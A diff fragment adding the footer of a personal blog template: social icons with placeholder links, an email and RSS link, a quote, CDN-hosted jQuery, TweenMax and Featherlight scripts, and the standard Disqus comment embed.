+                        <a href="https://oneplus.github.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://oneplus.github.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-instagram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://oneplus.github.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-dribbble"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://oneplus.github.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-google-plus"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://oneplus.github.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-behance"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://oneplus.github.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-500px"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:legendtanoybose@gmail.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="/atom.xml">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-rss"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    If your actions inspire others to dream more, learn more, do more and become more, you are a leader.
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+<script type="text/javascript">
+    var disqus_shortname = 'oneplus';
+
+    (function(){
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+</body>
+
+</html>
